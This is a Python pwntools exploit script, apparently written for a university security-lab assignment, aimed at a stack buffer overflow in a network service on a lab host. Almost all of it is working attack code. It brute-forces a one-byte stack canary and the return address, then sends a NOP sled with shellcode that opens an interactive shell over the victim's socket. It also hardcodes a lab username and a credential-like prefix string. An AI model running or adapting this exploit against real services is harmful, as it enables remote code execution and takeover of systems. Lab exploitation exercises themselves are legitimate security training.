#!virtualenv/bin/python2

"""Imports"""
from pwn import *

""" Global constants """
# bandit connection
USERNAME = 'inetsec028'
BANDIT = 'secenv.seclab.tuwien.ac.at'
BANDIT_PORT = 10001

# live server connection from bandit
PORT = 2000
LIVE_SRV = '10.10.1.2'

STR_PREFIX = 'inetsec028:aezuthah:'
TIMEOUT = 3
MAX_BUF = 4095

# Configure what you want to do and guess
TEST = False  # Use localhost or the live system via ssh
GUESS_CANARY = False
GUESS_ADDRESS = False

""" Global variables """
ssh_conn = None


def get_tube():
    if (ssh_conn):
        return ssh_conn.connect_remote(LIVE_SRV, PORT)
    else:
        return remote('localhost', PORT)


def check_canary(char):
    with get_tube() as r:
        str = STR_PREFIX + 'X' * 400 + char

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return not output or not re.match('STACK SMASHING DETECTED', output)


def guess_canary():
    canary = None

    for i in range(0, 255, 1):
        print("Testing canary 0x%02x" % i)
        if check_canary(chr(i)):
            canary = i
            break

    if canary:
        print("canary is 0x%02x" % canary)
    else:
        print("Canary not found (something went wrong)")

    return canary


def check_address(canary, address):
    with get_tube() as r:

        str = STR_PREFIX + 'A' * 400 + chr(canary) + cyclic(12, n=1) + p32(address) + '\0'

        test = "!! RIGHT ADDRESS FOUND !!"

        # Shellcode
        sh = asm(shellcraft.findpeer()  # Find the socket which is connected to us
                 + shellcraft.mov('ebp', 'esi')  # Copy the socket address to ebp
                 + shellcraft.echo(test + "\n")  # Echo some text to the fd pointed to by ebp
                 + shellcraft.syscall('SYS_exit', 0))  # Exit smoothly

        # NOP sled
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return output and re.match(test, output)


def guess_address(canary):
    address = None

    for i in range(0xffffffff, 0xffff0101, -0x0800):
        print("Testing address 0x%08x" % i)
        if check_address(canary, i):
            address = i
            break

    if address:
        print("address is 0x%08x" % address)
    else:
        print("Address not found (something went wrong)")

    return address


def exploit(canary, address):
    with get_tube() as r:
        str = STR_PREFIX + 'A' * 400 + chr(canary) + cyclic(12, n=1) + p32(address) + '\0'

        # Shellcode
        sh = asm(shellcraft.findpeersh())
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

        r.interactive()


def main(argv):
    """ Main entry point for the script """
    global ssh_conn

    context(arch='i386', os='linux')

    """ Setup the ssh connection """
    if not TEST:
        """ Attention: This works only if your SSH key is registered at the server """
        ssh_conn = ssh(host=BANDIT, user=USERNAME, port=BANDIT_PORT)

    if GUESS_CANARY:
        canary = guess_canary()
    else:
        if TEST:
            canary = ord('i')  # Canary with on my test implementation
        else:
            canary = 0x22  # Found out by the guess method

    if GUESS_ADDRESS:
        address = guess_address(canary)
    else:
        if TEST:
            address = 0xffffcc01  # Address on my test system
        else:
            address = 0xffffd7ff  # Found out by the guess method

    exploit(canary, address)


if __name__ == '__main__':
    sys.exit(main(sys.argv))
